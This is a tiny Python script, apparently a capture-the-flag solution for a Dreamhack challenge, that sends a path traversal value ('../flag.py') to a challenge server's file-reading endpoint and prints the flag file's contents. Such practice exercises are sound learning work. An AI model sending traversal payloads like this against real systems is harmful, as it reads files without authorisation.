




import requests


HOST = "http://host3.dreamhack.games:21908/read"

PARAMS = {
    "name":"../flag.py"
}


r = requests.get(HOST, params=PARAMS)
print(r.text)










